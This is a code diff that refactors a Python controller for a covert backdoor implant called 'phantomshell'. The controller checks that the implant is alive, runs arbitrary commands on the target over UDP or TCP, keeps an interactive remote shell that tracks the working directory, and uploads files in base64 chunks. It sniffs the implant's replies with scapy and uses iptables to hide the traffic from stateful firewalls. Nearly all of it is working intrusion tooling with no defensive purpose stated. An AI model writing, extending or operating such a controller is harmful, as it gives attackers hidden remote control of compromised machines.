@@ -19,6 +19,10 @@ def dbg(msg):
         print(f"[d {ts}.{ms:03d}] {msg}", file=sys.stderr)
 
 
+class ConnectError(Exception):
+    pass
+
+
 # ---------------------------------------------------------------------------
 # Shared
 # ---------------------------------------------------------------------------
@@ -64,14 +68,7 @@ def recv_timeout(sock, timeout=3, token=None):
     dbg(f"recv_timeout: done, {len(chunks)} chunks, matched={matched}")
     if tok and not matched:
         return None
-    # Ensure each chunk ends with a newline so responses from
-    # multiple service instances don't concatenate on one line
-    normalized = []
-    for c in chunks:
-        normalized.append(c)
-        if c and not c.endswith(b'\n') and not c.endswith(b'\r\n'):
-            normalized.append(b'\n')
-    return b"".join(normalized)
+    return b"".join(chunks)
 
 
 # ---------------------------------------------------------------------------
@@ -81,83 +78,16 @@ def recv_timeout(sock, timeout=3, token=None):
 def udp_send_recv(target, port, payload, timeout=3, token=None):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(("0.0.0.0", 0))
-    local_addr = sock.getsockname()
-    dbg(f"udp_send_recv: bound to {local_addr}, sending {len(payload)} bytes to {target}:{port}")
+    dbg(f"udp_send_recv: sending {len(payload)} bytes to {target}:{port}")
     sock.sendto(payload.encode(), (target, port))
+    if token is None:
+        sock.close()
+        return None
     dbg(f"udp_send_recv: sent, now receiving...")
     output = recv_timeout(sock, timeout, token)
     dbg(f"udp_send_recv: result={len(output) if output else None} bytes")
     sock.close()
     return output
-
-
-def udp_status(target, port, timeout=3):
-    token = gen_token()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(("0.0.0.0", 0))
-    local_addr = sock.getsockname()
-    sock.settimeout(timeout)
-    dbg(f"udp_status: bound to {local_addr}, sending status:{token} to {target}:{port}, timeout={timeout}s")
-    sock.sendto(f"status:{token}".encode(), (target, port))
-    expected = f"{token}up".encode()
-    dbg(f"udp_status: expecting {expected}")
-    try:
-        while True:
-            data, addr = sock.recvfrom(4096)
-            dbg(f"udp_status: got {len(data)} bytes from {addr}: {data}")
-            if data == expected:
-                dbg(f"udp_status: match=True")
-                sock.close()
-                return True
-            dbg(f"udp_status: no match, continuing")
-    except socket.timeout:
-        dbg(f"udp_status: timeout after {timeout}s, no match")
-        sock.close()
-        return False
-    except OSError as e:
-        dbg(f"udp_status: OSError: {e}")
-        sock.close()
-        return False
-
-
-def udp_run(target, port, cmd, prefix, timeout=3):
-    if prefix == "run:":
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(f"run:{cmd}".encode(), (target, port))
-        sock.close()
-        return None
-    token = gen_token()
-    payload = f"runcap:{token}:{cmd}:{token}"
-    return udp_send_recv(target, port, payload, timeout, token)
-
-
-def udp_interactive(target, port, prefix, timeout=3):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(("0.0.0.0", 0))
-    while True:
-        try:
-            cmd = input("phantomshell>> ").strip()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            break
-        if not cmd or cmd == "exit":
-            break
-        token = gen_token()
-        if prefix == "runcap:":
-            sock.sendto(f"runcap:{token}:{cmd}:{token}".encode(), (target, port))
-        else:
-            sock.sendto(f"run:{cmd}".encode(), (target, port))
-        if prefix != "run:":
-            output = recv_timeout(sock, timeout, token)
-            if output:
-                text = output.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
-                if not text.endswith(b'\n'):
-                    text += b'\n'
-                sys.stdout.buffer.write(text)
-                sys.stdout.flush()
-            elif output is not None:
-                print("[+] Command run; no output")
-    sock.close()
 
 
 # ---------------------------------------------------------------------------
@@ -243,7 +173,6 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
         return b""
 
     TCP = sc["TCP"]
-    Raw = sc["Raw"]
     sniff_fn = sc["sniff"]
     tok = token.encode() if token else None
     iface = _get_iface_for_target(target)
@@ -268,9 +197,6 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
         return None
 
     def _stop(pkt):
-        # Only stop on end markers (bare token or data ending with token),
-        # NOT on response packets — avoids losing the response when scapy
-        # drops the stop-trigger packet under concurrent sniff load.
         payload = _tcp_payload(pkt)
         if payload:
             if tok and (payload == tok or payload.endswith(tok)):
@@ -294,9 +220,6 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
             raw = _tcp_payload(pkt)
             if raw:
                 if tok:
-                    # The implant prefixes EVERY reply packet with the token.
-                    # Any packet without the token is service noise (SSH banner,
-                    # HTTP response, etc.) and must be discarded.
                     parts = raw.split(tok)
                     if len(parts) < 2:
                         dbg(f"sniff: skip non-token: {raw[:40]}")
@@ -305,7 +228,6 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
                     for part in parts[1:]:
                         if part:
                             chunks.append(part)
-                    # End marker: bare token or data ending with token
                     if raw == tok or raw.endswith(tok):
                         end_seen = True
                 else:
@@ -316,7 +238,6 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
         if end_seen:
             dbg("sniff: end marker received")
             break
-        # If we got data but this window had no packets, implant is done
         if matched and not packets:
             dbg("sniff: silence after data, stopping")
             break
@@ -324,14 +245,7 @@ def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, re
     dbg(f"sniff: total {len(chunks)} chunks, {sum(len(c) for c in chunks)} bytes matched={matched}")
     if tok and not matched:
         return None
-    # Ensure each chunk (from a separate packet) ends with a newline
-    # so responses from multiple service instances don't concatenate
-    normalized = []
-    for c in chunks:
-        normalized.append(c)
-        if c and not c.endswith(b'\n') and not c.endswith(b'\r\n'):
-            normalized.append(b'\n')
-    return b"".join(normalized)
+    return b"".join(chunks)
 
 
 # ---------------------------------------------------------------------------
@@ -355,7 +269,7 @@ def tcp_connect_send(target, port, payload, timeout=3, token=None):
     except (socket.timeout, ConnectionRefusedError, OSError) as e:
         tcp_sock.close()
         dbg(f"tcp_connect: failed: {e}")
-        return ("__CONN_ERR__", str(e))
+        raise ConnectError(str(e))
 
     _ipt_drop_input(target, port, local_port)
 
@@ -381,66 +295,86 @@ def tcp_connect_send(target, port, payload, timeout=3, token=None):
         tcp_sock.close()
 
     # token mode: b"" is valid (empty output), None means no token match
-    # legacy mode: b"" means no response → try fallback
     if token is not None:
         return output
     return output if output else None
 
 
 # ---------------------------------------------------------------------------
-# TCP combined
+# Unified command dispatch
 # ---------------------------------------------------------------------------
 
-def tcp_status(target, port, timeout=3):
-    """Probe implant via TCP connect. Returns True, False, or a string error."""
+def check_status(send_fn, timeout=3):
     token = gen_token()
-    probe_timeout = min(timeout, 3)
-    out = tcp_connect_send(target, port, f"status:{token}", probe_timeout, token)
-    if isinstance(out, tuple) and out[0] == "__CONN_ERR__":
-        return out[1]  # return error string
-    if out is not None:
-        dbg(f"tcp_status: connect succeeded")
-        return b"up" in out
-    return False
+    out = send_fn(f"status:{token}:{token}", min(timeout, 3), token)
+    return out is not None and b"up" in out
 
 
-def tcp_run(target, port, cmd, prefix, timeout=3):
+def run_command(send_fn, cmd, prefix, timeout=3):
+    token = gen_token()
+    payload = f"{prefix}{token}:{cmd}:{token}"
     if prefix == "run:":
-        result = tcp_connect_send(target, port, f"run:{cmd}", timeout)
-        if isinstance(result, tuple) and result[0] == "__CONN_ERR__":
-            print(f"[-] {result[1]}", file=sys.stderr)
+        try:
+            send_fn(payload, timeout)
+        except ConnectError as e:
+            print(f"[-] {e}", file=sys.stderr)
         return None
-    token = gen_token()
-    payload = f"runcap:{token}:{cmd}:{token}"
-    result = tcp_connect_send(target, port, payload, timeout, token)
-    if isinstance(result, tuple) and result[0] == "__CONN_ERR__":
-        print(f"[-] {result[1]}", file=sys.stderr)
+    try:
+        return send_fn(payload, timeout, token)
+    except ConnectError as e:
+        print(f"[-] {e}", file=sys.stderr)
         return None
-    return result
 
 
-def tcp_interactive(target, port, prefix, timeout=3):
+def interactive(send_fn, prefix, timeout=3):
+    cwd = "/"
+    if prefix == "runcap:":
+        token = gen_token()
+        try:
+            out = send_fn(f"runcap:{token}:pwd:{token}", timeout, token)
+            if out:
+                cwd = out.strip().decode()
+        except ConnectError:
+            pass
+
     while True:
         try:
-            cmd = input("phantomshell>> ").strip()
+            cmd = input(f"phantomshell {cwd}>> ").strip()
         except (EOFError, KeyboardInterrupt):
             print()
             break
         if not cmd or cmd == "exit":
             break
+        token = gen_token()
+        marker = gen_token()
         if prefix == "runcap:":
-            token = gen_token()
-            output = tcp_connect_send(target, port, f"runcap:{token}:{cmd}:{token}", timeout, token)
-        else:
-            output = tcp_connect_send(target, port, f"run:{cmd}", timeout)
-        if output:
+            wrapped = f"cd '{cwd}' && {cmd}; echo CWD{marker}; pwd"
+            payload = f"runcap:{token}:{wrapped}:{token}"
+            try:
+                output = send_fn(payload, timeout, token)
+            except ConnectError as e:
+                print(f"[-] {e}", file=sys.stderr)
+                continue
+            if not output:
+                continue
             text = output.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
-            if not text.endswith(b'\n'):
-                text += b'\n'
-            sys.stdout.buffer.write(text)
-            sys.stdout.flush()
-        elif output is not None and prefix == "runcap:":
-            print("[+] Command run; no output")
+            sep = f"CWD{marker}\n".encode()
+            parts = text.rsplit(sep, 1)
+            if len(parts) == 2:
+                text = parts[0]
+                cwd = parts[1].strip().decode()
+            if text:
+                if not text.endswith(b'\n'):
+                    text += b'\n'
+                sys.stdout.buffer.write(text)
+                sys.stdout.flush()
+        else:
+            wrapped = f"cd '{cwd}' && {cmd}"
+            payload = f"run:{token}:{wrapped}:{token}"
+            try:
+                send_fn(payload, timeout)
+            except ConnectError as e:
+                print(f"[-] {e}", file=sys.stderr)
 
 
 # ---------------------------------------------------------------------------
@@ -454,10 +388,7 @@ def tcp_upload(target, port, local_path, remote_path, timeout=10):
     b64 = base64.b64encode(data).decode()
     file_size = len(data)
 
-    # Keep b64 chunks small enough to fit in a single TCP segment.
-    # MSS ~1460 minus protocol overhead (write:<mode>:<path>:)
-    # Must be a multiple of 4 so chunks align to b64 group boundaries.
-    overhead = 6 + 2 + len(remote_path) + 1  # write: + w: + path + :
+    overhead = 6 + 8 + 1 + 2 + len(remote_path) + 1 + 1 + 8
     chunk_size = ((1400 - overhead) // 4) * 4
     chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
 
@@ -465,7 +396,8 @@ def tcp_upload(target, port, local_path, remote_path, timeout=10):
 
     for i, chunk in enumerate(chunks):
         mode = 'w' if i == 0 else 'a'
-        payload = f"write:{mode}:{remote_path}:{chunk}"
+        token = gen_token()
+        payload = f"write:{token}:{mode}:{remote_path}:{chunk}:{token}"
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         try:
@@ -524,16 +456,14 @@ stateful firewalls. Reply is sniffed via scapy (requires root).
     global DEBUG
     DEBUG = args.debug
 
-    up_from = getattr(args, 'up_from', None)
-    up_to = getattr(args, 'up_to', None)
-    if up_from and not up_to:
+    if args.up_from and not args.up_to:
         parser.error("--up-from requires --up-to")
-    if up_to and not up_from:
+    if args.up_to and not args.up_from:
         parser.error("--up-to requires --up-from")
-    if up_from and not args.tcp:
+    if args.up_from and not args.tcp:
         parser.error("--up-from/--up-to require --tcp")
-    if up_from and not os.path.isfile(up_from):
-        parser.error(f"local file not found: {up_from}")
+    if args.up_from and not os.path.isfile(args.up_from):
+        parser.error(f"local file not found: {args.up_from}")
 
     use_tcp = args.tcp
     if args.timeout is None:
@@ -541,10 +471,9 @@ stateful firewalls. Reply is sniffed via scapy (requires root).
     prefix = "run:" if args.nocap else "runcap:"
     proto = "TCP" if use_tcp else "UDP"
 
-    # Upload is plain TCP connect — no scapy/root/status needed
-    if up_from:
+    if args.up_from:
         print(f"[*] {proto} -> {args.target}:{args.port}")
-        ok = tcp_upload(args.target, args.port, up_from, up_to, args.timeout)
+        ok = tcp_upload(args.target, args.port, args.up_from, args.up_to, args.timeout)
         sys.exit(0 if ok else 1)
 
     if use_tcp:
@@ -558,47 +487,50 @@ stateful firewalls. Reply is sniffed via scapy (requires root).
 
     print(f"[*] {proto} -> {args.target}:{args.port}")
 
-    # Status check
     if use_tcp:
-        ok = tcp_status(args.target, args.port, args.timeout)
+        def send_fn(payload, timeout, token=None):
+            return tcp_connect_send(args.target, args.port, payload, timeout, token)
     else:
-        ok = udp_status(args.target, args.port, args.timeout)
+        def send_fn(payload, timeout, token=None):
+            return udp_send_recv(args.target, args.port, payload, timeout, token)
 
-    if ok is True:
-        print("[+] phantomshell alive")
-    elif isinstance(ok, str):
-        print(f"[-] {ok}")
+    try:
+        ok = check_status(send_fn, args.timeout)
+    except ConnectError as e:
+        print(f"[-] {e}")
         print(f"[-] TCP requires an open port on the target. Is port {args.port} reachable?")
         sys.exit(1)
+
+    if ok:
+        print("[+] phantomshell alive")
     else:
         print("[-] No reply")
         if not use_tcp:
             sys.exit(1)
         print("[*] Continuing anyway (service may absorb status probe)")
 
-    # Dispatch
     if args.interactive:
-        if use_tcp:
-            tcp_interactive(args.target, args.port, prefix, args.timeout)
-        else:
-            udp_interactive(args.target, args.port, prefix, args.timeout)
+        if not use_tcp:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.bind(("0.0.0.0", 0))
+            def send_fn(payload, timeout, token=None):
+                sock.sendto(payload.encode(), (args.target, args.port))
+                if token is None:
+                    return None
+                return recv_timeout(sock, timeout, token)
+        interactive(send_fn, prefix, args.timeout)
+        if not use_tcp:
+            sock.close()
     elif args.command:
-        if use_tcp:
-            output = tcp_run(args.target, args.port, args.command, prefix, args.timeout)
-        else:
-            output = udp_run(args.target, args.port, args.command, prefix, args.timeout)
-        if output is not None and output:
-            # Normalize line endings and deduplicate stacked responses
+        output = run_command(send_fn, args.command, prefix, args.timeout)
+        if output:
             text = output.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
-            # Split into lines, filter empties, rejoin with newlines
             lines = [l for l in text.split(b'\n') if l]
             text = b'\n'.join(lines) + b'\n'
             sys.stdout.buffer.write(text)
             sys.stdout.flush()
-        elif output is not None and not output and prefix == "runcap:":
+        elif output is not None and prefix == "runcap:":
             print("[+] Command run; no output")
-    else:
-        pass
 
 
 if __name__ == "__main__":
